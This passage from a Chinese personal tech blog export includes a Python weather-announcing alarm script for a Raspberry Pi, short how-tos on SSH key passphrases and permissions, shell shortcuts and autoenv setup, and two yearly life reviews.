<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time     : 2017/1/15 15:16</span></span><br><span class="line"><span class="comment"># @Author   : woodenrobot</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safar&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;i/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">numtozh</span>(<span class="params">num</span>):</span><br><span class="line">    num_dict = &#123;<span class="number">1</span>: <span class="string">&#x27;一&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;二&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;三&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;四&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;五&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;六&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;七&#x27;</span>,</span><br><span class="line">                <span class="number">8</span>: <span class="string">&#x27;八&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;九&#x27;</span>, <span class="number">0</span>: <span class="string">&#x27;零&#x27;</span>&#125;</span><br><span class="line">    num = <span class="built_in">int</span>(num)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">100</span> &lt;= num &lt; <span class="number">1000</span>:</span><br><span class="line">        b_num = num // <span class="number">100</span></span><br><span class="line">        s_num = (num-b_num*<span class="number">100</span>) // <span class="number">10</span></span><br><span class="line">        g_num = (num-b_num*<span class="number">100</span>) % <span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> g_num == <span class="number">0</span> <span class="keyword">and</span> s_num == <span class="number">0</span>:</span><br><span class="line">            num = <span class="string">&#x27;%s百&#x27;</span> % (num_dict[b_num])</span><br><span class="line">        <span class="keyword">elif</span> s_num == <span class="number">0</span>:</span><br><span class="line">            num = <span class="string">&#x27;%s百%s%s&#x27;</span> % (num_dict[b_num], num_dict.get(s_num, <span class="string">&#x27;&#x27;</span>), num_dict.get(g_num, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> g_num == <span class="number">0</span>:</span><br><span class="line">            num = <span class="string">&#x27;%s百%s十&#x27;</span> % (num_dict[b_num], num_dict.get(s_num, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = <span class="string">&#x27;%s百%s十%s&#x27;</span> % (num_dict[b_num], num_dict.get(s_num, <span class="string">&#x27;&#x27;</span>), num_dict.get(g_num, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">10</span> &lt;= num &lt; <span class="number">100</span>:</span><br><span class="line">        s_num = num // <span class="number">10</span></span><br><span class="line">        g_num = (num-s_num*<span class="number">10</span>) % <span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> g_num == <span class="number">0</span>:</span><br><span class="line">            g_num = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        num = <span class="string">&#x27;%s十%s&#x27;</span> % (num_dict[s_num], num_dict.get(g_num, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0</span> &lt;= num &lt; <span class="number">10</span>:</span><br><span class="line">        g_num = num</span><br><span class="line">        num = <span class="string">&#x27;%s&#x27;</span> % (num_dict[g_num])</span><br><span class="line">    <span class="keyword">elif</span> -<span class="number">10</span> &lt; num &lt; <span class="number">0</span>:</span><br><span class="line">        g_num = -num</span><br><span class="line">        num = <span class="string">&#x27;零下%s&#x27;</span> % (num_dict[g_num])</span><br><span class="line">    <span class="keyword">elif</span> -<span class="number">100</span> &lt; num &lt;= -<span class="number">10</span>:</span><br><span class="line">        num = -num</span><br><span class="line">        s_num = num // <span class="number">10</span></span><br><span class="line">        g_num = (num-s_num*<span class="number">10</span>) % <span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> g_num == <span class="number">0</span>:</span><br><span class="line">            g_num = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        num = <span class="string">&#x27;零下%s十%s&#x27;</span> % (num_dict[s_num], num_dict.get(g_num, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_weather</span>():</span><br><span class="line">    <span class="comment"># 下载墨迹天气主页源码</span></span><br><span class="line">    res = requests.get(<span class="string">&#x27;http://tianqi.moji.com/&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="comment"># 用BeautifulSoup获取所需信息</span></span><br><span class="line">    soup = BeautifulSoup(res.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    temp = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_weather clearfix&#x27;</span>&#125;).em.getText()</span><br><span class="line">    temp = numtozh(<span class="built_in">int</span>(temp))</span><br><span class="line">    weather = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_weather clearfix&#x27;</span>&#125;).b.getText()</span><br><span class="line">    sd = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_about clearfix&#x27;</span>&#125;).span.getText()</span><br><span class="line">    sd_num = re.search(<span class="string">r&#x27;\d+&#x27;</span>, sd).group()</span><br><span class="line">    sd_num_zh = numtozh(<span class="built_in">int</span>(sd_num))</span><br><span class="line">    sd = sd.replace(sd_num, sd_num_zh)</span><br><span class="line">    wind = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_about clearfix&#x27;</span>&#125;).em.getText()</span><br><span class="line">    aqi = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_alert clearfix&#x27;</span>&#125;).em.getText()</span><br><span class="line">    aqi_num = re.search(<span class="string">r&#x27;\d+&#x27;</span>, aqi).group()</span><br><span class="line">    aqi_num_zh = numtozh(<span class="built_in">int</span>(aqi_num))</span><br><span class="line">    aqi = aqi.replace(aqi_num, aqi_num_zh).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;,空气质量&#x27;</span>)</span><br><span class="line">    info = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_tips clearfix&#x27;</span>&#125;).em.getText()</span><br><span class="line">    sd = sd.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;百分之&#x27;</span>).replace(<span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    aqi = <span class="string">&#x27;aqi&#x27;</span> + aqi</span><br><span class="line">    info = info.replace(<span class="string">&#x27;，&#x27;</span>, <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取今天的日期</span></span><br><span class="line">    today = datetime.now().date().strftime(<span class="string">&#x27;%Y年%m月%d日&#x27;</span>)</span><br><span class="line">    <span class="comment"># 将获取的信息拼接成一句话</span></span><br><span class="line">    text = <span class="string">&#x27;早上好！今天是%s,天气%s,温度%s摄氏度,%s,%s,%s,%s&#x27;</span> % \</span><br><span class="line">           (today, weather, temp, sd, wind, aqi, info)</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text2voice</span>(<span class="params">text</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://tts.baidu.com/text2audio?idx=1&amp;tex=&#123;0&#125;&amp;cuid=baidu_speech_&#x27;</span> \</span><br><span class="line">          <span class="string">&#x27;demo&amp;cod=2&amp;lan=zh&amp;ctp=1&amp;pdt=1&amp;spd=4&amp;per=4&amp;vol=5&amp;pit=5&#x27;</span>.<span class="built_in">format</span>(text)</span><br><span class="line">    <span class="comment"># 直接播放语音</span></span><br><span class="line">    os.system(<span class="string">&#x27;mplayer &quot;%s&quot;&#x27;</span> % url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 获取需要转换语音的文字</span></span><br><span class="line">    text = get_weather()</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="comment"># 获取音乐文件绝对地址</span></span><br><span class="line">    mp3path2 = os.path.join(os.path.dirname(__file__), <span class="string">&#x27;2.mp3&#x27;</span>)</span><br><span class="line">    <span class="comment"># 先播放一首音乐做闹钟</span></span><br><span class="line">    os.system(<span class="string">&#x27;mplayer %s&#x27;</span> % mp3path2)</span><br><span class="line">    <span class="comment"># 播报语音天气</span></span><br><span class="line">    text2voice(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>取消 SSH 私钥密码</title>
    <url>/2018/01/30/%E5%8F%96%E6%B6%88-SSH-%E7%A7%81%E9%92%A5%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>生成 SSH 秘钥时，会让你输入私钥的密码，直接回车则意为不设密码，如果设置了私钥密码，每次使用 SSH 进行操作都需要输入私钥密码。虽然这样增加了安全性，但是使用 SSH 的目的很多时候就是想更加方便，跳过输入账号密码这一步。只要保存好自己的私钥不泄露，一般不设私钥密码是没有太大的风险的。如果已经生成带密码的私钥，又想取消密码可以按下列两种方法操作。</p>
<span id="more"></span>

<h1 id="取消-SSH-私钥密码"><a href="#取消-SSH-私钥密码" class="headerlink" title="取消 SSH 私钥密码"></a>取消 SSH 私钥密码</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>使用 ssh-keygen 命令更改 SSH Key 密码，进入秘钥所在到的文件夹内（一般为<code>~/.ssh</code>）,执行下列命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -f id_rsa -p</span><br></pre></td></tr></table></figure>
<p>执行命令后，会让你先输入旧密码，然后输入两次新密码，新密码为空则为没有密码。</p>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>1.使用openssl命令去掉私钥的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa -in ~/.ssh/id_rsa -out ~/.ssh/id_rsa_new</span><br></pre></td></tr></table></figure>
<p>2.备份旧私钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv ~/.ssh/id_rsa ~/.ssh/id_rsa.backup</span><br></pre></td></tr></table></figure>
<p>3.使用新私钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv ~/.ssh/id_rsa_new ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<p>4.设置权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>

<p>推荐使用方法一来取消 SSH 私钥密码。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://www.cyberciti.biz/faq/howto-ssh-changing-passphrase/">OpenSSH Change a Passphrase With ssh-keygen command</a></li>
<li><a href="http://www.au92.com/archives/remove-passphrase-password-from-private-rsa-key.html">SSH私钥取消密码（passphrase ）</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>回归正轨的 2017 年</title>
    <url>/2018/01/01/%E5%9B%9E%E5%BD%92%E6%AD%A3%E8%BD%A8%E7%9A%84-2017-%E5%B9%B4/</url>
    <content><![CDATA[<p>2017 年在观看 REAL - Original Generation 街舞比赛后画上了句号。<br><img src="/images/2018WechatIMG58.jpeg"></p>
<span id="more"></span>
<hr>
<p>回顾 2017 年：<br>这一年阅读量急剧下降从 2016 年的 37 本书下降到 9 本。<br><img src="/images/2018books.png"><br><img src="/images/2018books1.png"><br>这一年看了 49 部影视剧相比去年减少 6 部。<br><img src="/images/2018test.png"><br><img src="/images/2018movies2.png"><br>这一年看了 26 部纪录片相比去年减少 16 部。<br><img src="/images/2018jilu.png"><br>这一年在成都又买了自行车骑了三次行。<br><img src="/images/2018WechatIMG62.png"><br><img src="/images/2018WechatIMG61.png"><br><img src="/images/2018WechatIMG63.png"><br>这一年买了 MacBook Pro、机械键盘、重新拾起了街舞办了张年卡 Keep on dancing!<br><img src="/images/2018mmexport1514785967909.jpg"><br><img src="/images/2018C360_2017-12-18-15-40-20-585.jpg"><br>2017 所有的事都在往好的地方开始发展了，2016年曾经的几个梦想也都差不多实现，但也有很多不足的地方。2018 年先从早睡早起开始保护革命的本钱，提高对时间的利用率，撸起袖子加油干！愿我们每一个人在 2018 年都能成为一个有趣的人。Life is short, should be fun!<br>最后感谢如家、红旗连锁、中国移动、易方达基金告诉我，按照阳历我又老了一岁！（Ps:排名按照发短信的时间!）</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
  </entry>
  <entry>
    <title>在Ubuntu14.04下创建可执行文件</title>
    <url>/2016/08/07/%E5%9C%A8Ubuntu14-04%E4%B8%8B%E5%88%9B%E5%BB%BA%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用ubuntu的过程中一些软件启动前总是需要执行一下shell语句启动或者出问题时重启，但是不常用的话总会忘记，于是萌生了做一个可执行文件双击执行一段shell语言。</p>
<span id="more"></span>
<h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><p>1.创建一个空白文档，并以<code>.sh</code>结尾；<br>2.打开这个文档输入你需要执行的shell语句；<br>3.在该文档所在文件夹打开终端，输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 700 文件名.sh</span><br></pre></td></tr></table></figure>
<p>为文件增加可执行权限；<br>4.选择文件夹上方菜单栏的<code>编辑</code>&gt;&gt;<code>首选项</code>&gt;&gt;<code>行为</code>&gt;&gt;<code>可执行文本文件</code>选择每次都询问。<br>5.双击打开创建好的可执行文件，选择终端打开即可。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>常用命令行快捷键</title>
    <url>/2018/06/18/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开发过程中经常会使用到命令行，有很多命令行快捷键可以很方便的提高我们的工作效率。</p>
<span id="more"></span>
<h1 id="Mac-iTerm2-设置"><a href="#Mac-iTerm2-设置" class="headerlink" title="Mac iTerm2 设置"></a>Mac iTerm2 设置</h1><p>Mac 下 iTerm2 需要设置一下才能使用一些快捷键。<br>打开 <code>Preferences &gt; Profiles &gt; Keys</code> 按下图所示选择 <code>Esc+</code>:<br><img src="/images/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BF%AB%E6%8D%B7%E9%94%AEkeyshorts.png"></p>
<h1 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h1><h2 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h2><table>
<thead>
<tr>
<th>快捷键</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl-a</td>
<td>移动光标到行首</td>
</tr>
<tr>
<td>Ctrl-e</td>
<td>移动光标到行尾</td>
</tr>
<tr>
<td>Ctrl-f</td>
<td>光标前移一个字符；和右箭头作用一样</td>
</tr>
<tr>
<td>Ctrl-b</td>
<td>光标后移一个字符；和左箭头作用一样</td>
</tr>
<tr>
<td>Alt-f</td>
<td>光标前移一个字</td>
</tr>
<tr>
<td>Alt-b</td>
<td>光标后移一个字</td>
</tr>
<tr>
<td>Ctrl-l</td>
<td>清空屏幕，移动光标到左上角。clear 命令完成同样的工作</td>
</tr>
</tbody></table>
<h2 id="修改文本"><a href="#修改文本" class="headerlink" title="修改文本"></a>修改文本</h2><table>
<thead>
<tr>
<th>快捷键</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl-d</td>
<td>删除光标位置的字符</td>
</tr>
<tr>
<td>Ctrl-t</td>
<td>光标位置的字符和光标前面的字符互换位置</td>
</tr>
<tr>
<td>Alt-t</td>
<td>光标位置的字和其前面的字互换位置</td>
</tr>
<tr>
<td>Alt-l</td>
<td>把从光标位置到字尾的字符转换成小写字母</td>
</tr>
<tr>
<td>Alt-u</td>
<td>把从光标位置到字尾的字符转换成大写字母</td>
</tr>
</tbody></table>
<h2 id="剪切和粘贴文本"><a href="#剪切和粘贴文本" class="headerlink" title="剪切和粘贴文本"></a>剪切和粘贴文本</h2><table>
<thead>
<tr>
<th>快捷键</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl-k</td>
<td>剪切从光标位置到行尾的文本</td>
</tr>
<tr>
<td>Ctrl-u</td>
<td>剪切从光标位置到行首的文本</td>
</tr>
<tr>
<td>Alt-d</td>
<td>剪切从光标位置到词尾的文本</td>
</tr>
<tr>
<td>Alt-Backspace(Mac 使用 Alt-delete)</td>
<td>剪切从光标位置到词头的文本。如果光标在一个单词的开头，剪切前一个单词</td>
</tr>
<tr>
<td>Ctrl-y</td>
<td>把剪切环中的文本粘贴到光标位置</td>
</tr>
</tbody></table>
<h2 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全"></a>自动补全</h2><table>
<thead>
<tr>
<th>快捷键</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>Tab</td>
<td>自动补全</td>
</tr>
<tr>
<td>Alt-?</td>
<td>显示可能的自动补全列表。在大多数系统中，你也可以完成这个通过按 两次 tab 键，这会更容易些</td>
</tr>
<tr>
<td>Alt-*</td>
<td>插入所有可能的自动补全。当你想要使用多个可能的匹配项时，这个很有帮助</td>
</tr>
</tbody></table>
<h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><table>
<thead>
<tr>
<th>快捷键</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl-p</td>
<td>移动到上一个历史条目。类似于上箭头按键</td>
</tr>
<tr>
<td>Ctrl-n</td>
<td>移动到下一个历史条目。类似于下箭头按键</td>
</tr>
<tr>
<td>Alt-&lt;</td>
<td>移动到历史列表开头</td>
</tr>
<tr>
<td>Alt-&gt;</td>
<td>移动到历史列表结尾，即当前命令行</td>
</tr>
<tr>
<td>Ctrl-r</td>
<td>反向递增搜索。从当前命令行开始，向上递增搜索</td>
</tr>
<tr>
<td>Alt-p</td>
<td>反向搜索，不是递增顺序。输入要查找的字符串，然后按下 Enter，执行搜索</td>
</tr>
<tr>
<td>Alt-n</td>
<td>向前搜索，非递增顺序</td>
</tr>
<tr>
<td>Ctrl-o</td>
<td>执行历史列表中的当前项，并移到下一个。如果你想要执行历史列表中一系列的命令，这很方便</td>
</tr>
</tbody></table>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="http://billie66.github.io/TLCL/book/chap09.html">快乐的 Linux 命令行 – 键盘高级操作技巧</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>懒人神器 autoenv</title>
    <url>/2017/11/16/%E6%87%92%E4%BA%BA%E7%A5%9E%E5%99%A8-autoenv/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>每次去不同的项目下运行程序都要更改相对应的 Python 环境，那么有什么办法可以省去这繁琐的一步吗？答案肯定是有的，Kenneth Reitz 已经为我们实现了—— autoenv。这个人名你可能没见过，但是说起他的另一个身份你肯定知道—— <a href="http://docs.python-requests.org/en/master/">Requests</a> 库的作者。</p>
<span id="more"></span>

<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Mac-OS-X-使用-Homebrew-安装"><a href="#Mac-OS-X-使用-Homebrew-安装" class="headerlink" title="Mac OS X 使用 Homebrew 安装"></a>Mac OS X 使用 Homebrew 安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ brew install autoenv</span><br><span class="line"># bash 使用这条命令</span><br><span class="line">$ echo &quot;source $(brew --prefix autoenv)/activate.sh&quot; &gt;&gt; ~/.bash_profile</span><br><span class="line"># zsh 使用这条命令</span><br><span class="line">$ echo &quot;source $(brew --prefix autoenv)/activate.sh&quot; &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>
<h2 id="使用-pip-安装"><a href="#使用-pip-安装" class="headerlink" title="使用 pip 安装"></a>使用 pip 安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pip install autoenv</span><br><span class="line"># bash 使用这条命令</span><br><span class="line">$ echo &quot;source `which activate.sh`&quot; &gt;&gt; ~/.bashrc</span><br><span class="line"># zsh 使用这条命令</span><br><span class="line">$ echo &quot;source `which activate.sh`&quot; &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>
<h2 id="使用-git-安装"><a href="#使用-git-安装" class="headerlink" title="使用 git 安装"></a>使用 git 安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone git://github.com/kennethreitz/autoenv.git ~/.autoenv</span><br><span class="line"># bash 使用这条命令</span><br><span class="line">$ echo &#x27;source ~/.autoenv/activate.sh&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line"># zsh 使用这条命令</span><br><span class="line">$ echo &#x27;source ~/.autoenv/activate.sh&#x27; &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>
<p>安装完成后重新打开 shell 生效。</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="virtualenvwrapper"><a href="#virtualenvwrapper" class="headerlink" title="virtualenvwrapper"></a>virtualenvwrapper</h2><p>通过下列命令在项目所在文件夹 project 内新建<code>.env</code>文件，并在改文件内写入进入项目环境的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;workon test&quot; &gt; project/.env</span><br></pre></td></tr></table></figure>
<p>上述命令以在 project (项目文件夹)内进入 virtualenvwrapper 创建的 test 虚拟环境为例，如何使用 virtualenvwrapper 可参考<a href="https://zhuanlan.zhihu.com/p/30859003">virtualenvwrapper + pyenv 打造多版本 Python 环境</a>。  </p>
<h2 id="virtualenv"><a href="#virtualenv" class="headerlink" title="virtualenv"></a>virtualenv</h2><p>如果你使用的是 virtualenv 那么命令应该是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;source venv/bin/activate&quot; &gt; project/.env</span><br></pre></td></tr></table></figure>
<p>上述命令以在 project (项目文件夹)内进入 virtualenv 创建的位于 project (项目文件夹)内的 venv 环境为例。<br><img src="https://camo.githubusercontent.com/92a0e6c8cfa3aae0e70f442fc915263ee59bf5bf/687474703a2f2f6d656469612e74756d626c722e636f6d2f74756d626c725f6c74757a6a766251364c31717a677078392e676966"><br><code>cd project</code>进入项目文件夹尽情享受 autoenv 带来的便利吧！</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>最后献上 Kenneth Reitz 大神的美照！<br><img src="/images/autoenvrequests2.jpg"></p>
<p>前<br>方<br>高<br>能<br>！<br>！<br>！<br>！<br>！<br>！<br>！<br>！<br>！<br>！<br>！<br>减<br>肥<br>后<br>是<br>这<br>样<br>的<br>！<br>！<br>！<br>！<br>！<br>！<br>！<br>！<br>！<br>！<br>！<br><img src="/images/autoenvrequests3.jpg"><br><img src="/images/autoenvrequests.jpg"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://github.com/kennethreitz/autoenv">autoenv</a></li>
<li><a href="https://www.kennethreitz.org/">Kenneth Reitz</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器 authorized_keys 添加公钥后登录仍需要密码</title>
    <url>/2018/07/23/%E6%9C%8D%E5%8A%A1%E5%99%A8-authorized-keys-%E6%B7%BB%E5%8A%A0%E5%85%AC%E9%92%A5%E5%90%8E%E7%99%BB%E5%BD%95%E4%BB%8D%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>在服务器的 <code>~/.ssh/authorized_keys</code> 文件内加入自己的公钥, 按理说下次在有该公钥的机器登录服务器时可以免密登录。但在一台服务器上遇到无法免密登录的情况。</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>造成这个问题的原因是 <code>~/.ssh</code> 文件夹和，文件夹内的文件权限不对。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd ~</span><br><span class="line">$ chmod 700 .ssh</span><br><span class="line">$ cd .ssh</span><br><span class="line">$ chmod 644 authorized_keys id_rsa.pub</span><br><span class="line">$ chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
<p>更改文件夹和文件为合适的权限后即可实现免密登录。<br>为什么要使用几个权限并不太清楚，虽然只要不给其他用户和用户组可写的权限都可以正常使用免密登录，但是尽量还是按照这几个文件及文件夹默认的权限去设置。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>波浪起伏的2016年</title>
    <url>/2017/01/01/%E6%B3%A2%E6%B5%AA%E8%B5%B7%E4%BC%8F%E7%9A%842016%E5%B9%B4/</url>
    <content><![CDATA[<p>2016年在重庆瓢虫的聚餐中开始，在成都瓢虫的年终聚餐中结尾。感谢瓢虫映像的大家给我这个独自在异乡漂泊的人带来了这么多的温暖，也感谢重庆和成都帮助我的同事和朋友，还有那些旅途上相遇的朋友感谢你们给我留下的美好回忆。  </p>
<span id="more"></span>
<hr>
<p>16年对我来说是波浪起伏的一年，看了37本书、<br><img src="/images/books.jpeg"><br>55部电影（电视剧）、<br><img src="/images/%E6%B3%A2%E6%B5%AA%E8%B5%B7%E4%BC%8F%E7%9A%842016%E5%B9%B4%20--%20%E7%94%B5%E5%BD%B1.jpeg"><br>42部纪录片、<br><img src="/images/%E7%BA%AA%E5%BD%95%E7%89%87.jpeg"><br>转了1次行，<br><img src="/images/%E6%B3%A2%E6%B5%AA%E8%B5%B7%E4%BC%8F%E7%9A%842016%E5%B9%B4131415382506640581.jpg"><br>骑行了1.3次，<br><img src="/images/%E6%B3%A2%E6%B5%AA%E8%B5%B7%E4%BC%8F%E7%9A%842016%E5%B9%B4558852214458543499.jpg"><br><img src="/images/%E6%B3%A2%E6%B5%AA%E8%B5%B7%E4%BC%8F%E7%9A%842016%E5%B9%B4121701187135444439.jpg"><br>在4个城市留下了印记（重庆、昆明、大理、成都）。</p>
<p>放开手去做的事好像都没有做得很完美，但是好在已经迈出了这一步。2017年希望自己早睡早起，身体健康，做好已经开始还不完美的事，接着做那些想做还没有做的事。愿我们每一个人都能在新的一年找到自己的方向。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
  </entry>
  <entry>
    <title>用BeautifulSoup库抓取信息时去掉字符串首尾空白的几种方法</title>
    <url>/2016/09/22/%E7%94%A8BeautifulSoup%E5%BA%93%E6%8A%93%E5%8F%96%E4%BF%A1%E6%81%AF%E6%97%B6%E5%8E%BB%E6%8E%89%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A6%96%E5%B0%BE%E7%A9%BA%E7%99%BD%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在抓取网页信息时经常遇到很多头尾加了空格的字符串，在此介绍几种处理的小技巧。</p>
<span id="more"></span>
